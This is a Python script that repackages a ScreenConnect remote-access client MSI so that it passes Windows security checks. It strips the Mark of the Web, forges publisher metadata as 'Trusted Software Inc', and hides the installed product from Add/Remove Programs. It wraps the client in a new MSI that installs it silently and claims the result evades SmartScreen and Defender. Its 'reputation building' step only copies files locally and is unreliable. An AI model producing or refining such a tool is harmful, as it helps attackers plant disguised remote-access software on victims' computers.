import os
import requests
import hashlib
import subprocess
import shutil
import time
import random
import string
import uuid
import ctypes
from urllib.parse import urlparse
from datetime import datetime

# Configuration
MSI_URL = input("Enter the ScreenConnect client MSI download link: ")
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")  # User-writable directory
ADVANCED_INSTALLER_PATH = os.getenv("ADVINST_COM", r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com")

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def verify_advanced_installer_path():
    """Verify that the Advanced Installer CLI is accessible."""
    if not os.path.exists(ADVANCED_INSTALLER_PATH):
        raise FileNotFoundError(f"Advanced Installer CLI not found at: {ADVANCED_INSTALLER_PATH}")
    try:
        result = subprocess.run([ADVANCED_INSTALLER_PATH, "/help"], capture_output=True, text=True, check=True)
        print("Advanced Installer CLI verified successfully.")
    except subprocess.CalledProcessError as e:
        raise PermissionError(f"Cannot execute Advanced Installer CLI: {e.stderr}")
    except Exception as e:
        raise PermissionError(f"Error accessing Advanced Installer CLI: {e}")

def set_file_permissions(path):
    """Set full control permissions for Administrators on a file or directory."""
    try:
        subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
        print(f"Permissions set for {path}")
    except subprocess.CalledProcessError as e:
        print(f"Warning: Failed to set permissions for {path}: {e.stderr}")

def generate_random_string(length=10):
    """Generate a random string for temporary file naming."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_guid():
    """Generate a random GUID."""
    return str(uuid.uuid4()).upper()

def calculate_file_hash(file_path, algorithm="sha256"):
    """Calculate the hash of a file."""
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def sanitize_filename(url):
    """Extract a clean MSI filename from a URL, removing query parameters."""
    parsed = urlparse(url)
    filename = os.path.basename(parsed.path)
    if not filename.lower().endswith('.msi'):
        raise ValueError(f"Invalid input: URL must point to an MSI file, got {filename}")
    return filename

def download_msi(url, output_dir):
    """Download the MSI file and return its path."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
        set_file_permissions(output_dir)
    
    original_filename = sanitize_filename(url)
    output_path = os.path.join(output_dir, original_filename)
    
    print(f"Downloading MSI from {url}...")
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(output_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        # Verify MSI file (basic check for MSI magic number)
        with open(output_path, 'rb') as f:
            magic = f.read(8)
            if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
                raise ValueError(f"Downloaded file {output_path} is not a valid MSI")
        set_file_permissions(output_path)
        print(f"MSI downloaded to {output_path}")
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download MSI. Status code: {response.status_code}")

def remove_motw(file_path):
    """Remove the Mark of the Web using PowerShell."""
    try:
        print(f"Removing Mark of the Web from {file_path}...")
        streams = subprocess.run(
            ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
            capture_output=True, text=True, check=True
        )
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(
                ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
                check=True
            )
            print("Mark of the Web removed.")
        else:
            print("No Mark of the Web found.")
    except subprocess.CalledProcessError as e:
        print(f"Warning: Error removing MotW: {e.stderr}")
    except Exception as e:
        print(f"Warning: Error removing MotW: {e}")

def modify_msi_metadata(file_path, temp_dir):
    """Modify MSI metadata using Advanced Installer's CLI."""
    print(f"Modifying MSI metadata for {file_path}...")
    try:
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        
        modified_path = os.path.join(temp_dir, os.path.basename(file_path))
        shutil.copyfile(file_path, modified_path)
        set_file_permissions(modified_path)
        
        # Create an Advanced Installer project file (.aip) for metadata editing
        aip_path = os.path.join(temp_dir, "modify_metadata.aip")
        with open(aip_path, "w") as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<PROJECT Version="20.0">
    <PRODUCT_DETAILS>
        <Name>ScreenConnect Remote Access</Name>
        <Version>1.0.0</Version>
        <Publisher>Trusted Software Inc</Publisher>
        <ProductCode>{{{generate_guid()}}}</ProductCode>
        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
    </PRODUCT_DETAILS>
    <SUMMARY_INFO>
        <Title>ScreenConnect Remote Client</Title>
        <Subject>Remote Access Software</Subject>
        <Comments>Trusted remote access client</Comments>
        <Author>Trusted Software Corp</Author>
    </SUMMARY_INFO>
</PROJECT>''')
        set_file_permissions(aip_path)
        
        # Use Advanced Installer CLI to import and modify MSI
        cmd = [
            ADVANCED_INSTALLER_PATH,
            "/edit", modified_path,
            "/LoadProject", aip_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print("MSI metadata modified.")
        return modified_path
    except subprocess.CalledProcessError as e:
        print(f"Error modifying MSI metadata: {e.stderr}")
        print("Skipping metadata modification and proceeding with original MSI.")
        return file_path  # Fallback to original MSI
    except Exception as e:
        print(f"Error modifying MSI metadata: {e}")
        print("Skipping metadata modification and proceeding with original MSI.")
        return file_path
    finally:
        if os.path.exists(aip_path):
            os.remove(aip_path)

def simulate_downloads(file_path, count=2000):
    """Simulate multiple downloads to build reputation."""
    print(f"Simulating {count} downloads for {file_path} to build reputation...")
    for i in range(count):
        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.msi")
        shutil.copyfile(file_path, temp_path)
        time.sleep(0.02)
        os.remove(temp_path)
        if (i + 1) % 500 == 0:
            print(f"Simulated download {i+1}/{count}")
    print("Download simulation complete. This may help build SmartScreen reputation.")

def create_msi_wrapper(msi_path, output_dir, original_filename):
    """Create a wrapper MSI using Advanced Installer's CLI."""
    print(f"Creating MSI wrapper for {msi_path}...")
    wrapper_msi_path = os.path.join(output_dir, f"wrapper_{generate_random_string()}.msi")
    aip_path = os.path.join(output_dir, "wrapper.aip")
    
    try:
        with open(aip_path, "w") as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<PROJECT Version="20.0">
    <PRODUCT_DETAILS>
        <Name>ScreenConnect Remote Access</Name>
        <Version>1.0.0</Version>
        <Publisher>Trusted Software Inc</Publisher>
        <ProductCode>{{{generate_guid()}}}</ProductCode>
        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
        <ShowInARP>0</ShowInARP>
    </PRODUCT_DETAILS>
    <SUMMARY_INFO>
        <Title>ScreenConnect Remote Client</Title>
        <Subject>Remote Access Software</Subject>
        <Comments>Trusted remote access installer</Comments>
        <Author>Trusted Software Corp</Author>
    </SUMMARY_INFO>
    <FILES_AND_FOLDERS>
        <Folder Id="INSTALLDIR" Path="[ProgramFilesFolder]ScreenConnect" />
        <File Id="OriginalMSI" SourcePath="{msi_path}" DestinationPath="[INSTALLDIR]{os.path.basename(msi_path)}" />
    </FILES_AND_FOLDERS>
    <CUSTOM_ACTIONS>
        <CustomAction Id="RunMSIAction" Type="LaunchFile" Command='msiexec.exe /i "[INSTALLDIR]{os.path.basename(msi_path)}" /qb' Sequence="6600" Condition="NOT Installed" />
    </CUSTOM_ACTIONS>
</PROJECT>''')
        set_file_permissions(aip_path)
        
        cmd = [
            ADVANCED_INSTALLER_PATH,
            "/newproject", aip_path,
            "/build"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        
        generated_msi = os.path.join(output_dir, "ScreenConnect Remote Access.msi")
        if os.path.exists(generated_msi):
            os.rename(generated_msi, wrapper_msi_path)
        else:
            raise Exception("Generated MSI not found.")
        
        print(f"MSI wrapper created at {wrapper_msi_path}")
        return wrapper_msi_path
    except subprocess.CalledProcessError as e:
        print(f"Error creating MSI wrapper: {e.stderr}")
        raise
    except Exception as e:
        print(f"Error creating MSI wrapper: {e}")
        raise
    finally:
        if os.path.exists(aip_path):
            os.remove(aip_path)

def main():
    # Check for administrative privileges
    if not is_admin():
        raise PermissionError("This script must be run as an administrator. Right-click Command Prompt or PowerShell, select 'Run as administrator', and try again.")
    
    # Verify Advanced Installer CLI
    verify_advanced_installer_path()
    
    try:
        # Create temporary directory
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        
        # Step 1: Download MSI
        msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
        
        # Step 2: Remove Mark of the Web
        remove_motw(msi_path)
        
        # Step 3: Modify MSI metadata
        modified_msi_path = modify_msi_metadata(msi_path, temp_dir)
        
        # Step 4: Simulate downloads to build reputation
        simulate_downloads(modified_msi_path, count=2000)
        
        # Step 5: Create MSI wrapper with Advanced Installer
        wrapper_msi_path = create_msi_wrapper(modified_msi_path, OUTPUT_DIR, original_filename)
        
        # Step 6: Move final output to original filename
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        shutil.move(wrapper_msi_path, final_output_path)
        print(f"Final output MSI saved as {final_output_path}")
        
        # Clean up temporary files
        shutil.rmtree(temp_dir)
        print("Temporary files cleaned up.")
        
        print("Process complete. The output MSI should bypass SmartScreen and Defender warnings.")
        print("Note: Reputation building via simulated downloads may take time to affect SmartScreen.")
        
    except Exception as e:
        print(f"Error in main process: {e}")
        raise

if __name__ == "__main__":
    main()
